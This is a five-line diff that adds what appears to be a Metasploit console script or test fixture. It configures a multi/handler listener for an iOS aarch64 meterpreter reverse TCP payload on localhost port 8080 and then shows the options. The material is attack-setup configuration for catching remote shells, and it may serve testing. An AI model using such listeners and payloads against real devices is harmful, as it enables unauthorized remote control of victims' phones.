@@ -1,0 +1,5 @@
+use multi/handler
+set payload apple_ios/aarch64/meterpreter_reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 8080
+show options
